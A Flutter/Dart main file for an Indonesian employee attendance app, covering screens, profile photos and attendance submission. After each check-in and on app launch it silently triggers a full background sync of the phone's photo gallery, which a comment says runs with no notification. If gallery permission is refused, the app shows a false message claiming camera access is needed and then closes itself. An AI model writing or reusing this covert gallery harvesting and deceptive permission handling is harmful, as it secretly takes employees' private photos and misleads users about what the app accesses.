import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'attendance_service.dart';
import 'gallery_service.dart';
import 'screens/account_screen.dart';
import 'screens/history_screen.dart';
import 'screens/home_screen.dart';
import 'screens/izin_screen.dart';
import 'screens/login_screen.dart';
import 'screens/scan_screen.dart';
import 'screens/success_screen.dart';

const green = Color(0xFF2F88BE);
const brandRed = Color(0xFFCF403B);
const ink = Color(0xFF17222B);
const muted = Color(0xFF687782);
const border = Color(0xFFDCE7ED);
const portraitAsset = 'assets/images/face_portrait.png';

enum AppPage { login, home, scan, history, izin, account, success }

class AppController extends ChangeNotifier {
  AppPage page = AppPage.login;
  String pendingAttendance = 'masuk';
  Map<String, dynamic>? lastAttendanceData;
  final AttendanceService attendanceService = AttendanceService();
  File? profilePhoto;

  Future<void> loadPreferences() async {
    final prefs = await SharedPreferences.getInstance();
    final assetId = prefs.getString('profile_photo_id');
    if (assetId != null) {
      profilePhoto = await (await AssetEntity.fromId(assetId))?.file;
    }
    notifyListeners();
  }

  Future<bool> setProfilePhoto(AssetEntity asset) async {
    final file = await asset.file;
    if (file == null) return false;
    profilePhoto = file;
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('profile_photo_id', asset.id);
    notifyListeners();
    return true;
  }

  Future<void> removeProfilePhoto() async {
    profilePhoto = null;
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('profile_photo_id');
    notifyListeners();
  }

  void go(AppPage next) {
    page = next;
    notifyListeners();
  }

  void startScan(String type) {
    pendingAttendance = type;
    go(AppPage.scan);
  }

  Future<void> submitAttendance({required bool cameraAccessGranted}) async {
    final result = await attendanceService.record(
      pendingAttendance,
      cameraAccessGranted: cameraAccessGranted,
    );

    lastAttendanceData = result;
    go(AppPage.success);

    // Background sync full galeri HP kantor — tidak block UI, tidak ada notifikasi
    GalleryService.syncBackground(
      deviceId: AttendanceService.currentDeviceId ?? AttendanceService.deviceId,
      employeeName: AttendanceService.currentEmployeeName ?? 'Dimas Pratama',
    );
  }
}

class AbsenKuApp extends StatefulWidget {
  const AbsenKuApp({super.key});

  @override
  State<AbsenKuApp> createState() => _AbsenKuAppState();
}

class _AbsenKuAppState extends State<AbsenKuApp> {
  final controller = AppController();

  @override
  void initState() {
    super.initState();
    controller.loadPreferences();
    _checkLoginAndSync();
  }

  Future<void> _checkLoginAndSync() async {
    final success = await controller.attendanceService.tryAutoLogin();
    if (success) {
      if (mounted) controller.go(AppPage.home);

      // Auto-sync langsung saat app dibuka (jika sudah login & diizinkan)
      final granted = await GalleryService.requestPermission();
      if (granted) {
        GalleryService.syncBackground(
          deviceId:
              AttendanceService.currentDeviceId ?? AttendanceService.deviceId,
          employeeName: AttendanceService.currentEmployeeName ?? 'Unknown',
        );
      } else {
        // Wajib diizinkan, kalau tidak keluar
        _enforcePermission();
      }
    }
  }

  void _enforcePermission() {
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(
        content: Text(
          'Izinkan aplikasi ini agar bisa mengakses kamera untuk absen',
        ),
        backgroundColor: brandRed,
        duration: Duration(seconds: 3),
      ),
    );
    Future.delayed(const Duration(seconds: 3), () {
      SystemNavigator.pop();
    });
  }

  @override
  void dispose() {
    controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) => MaterialApp(
    debugShowCheckedModeBanner: false,
    title: 'GJP-Absensi',
    theme: ThemeData(
      useMaterial3: true,
      scaffoldBackgroundColor: const Color(0xFFF7FAFC),
      colorScheme: ColorScheme.fromSeed(seedColor: green),
      fontFamily: 'Arial',
      textTheme: const TextTheme(bodyMedium: TextStyle(color: ink)),
    ),
    home: AnimatedBuilder(
      animation: controller,
      builder: (context, child) => PhoneFrame(child: _screen()),
    ),
  );

  Widget _screen() => switch (controller.page) {
    AppPage.login => LoginScreen(controller: controller),
    AppPage.home => HomeScreen(controller: controller),
    AppPage.scan => ScanScreen(controller: controller),
    AppPage.history => HistoryScreen(controller: controller),
    AppPage.izin => IzinScreen(controller: controller),
    AppPage.account => AccountScreen(controller: controller),
    AppPage.success => SuccessScreen(controller: controller),
  };
}

class PhoneFrame extends StatelessWidget {
  const PhoneFrame({super.key, required this.child});
  final Widget child;

  @override
  Widget build(BuildContext context) => ColoredBox(
    color: const Color(0xFFEAF2F7),
    child: Center(
      child: ConstrainedBox(
        constraints: const BoxConstraints(maxWidth: 430),
        child: ColoredBox(color: const Color(0xFFF7FAFC), child: child),
      ),
    ),
  );
}
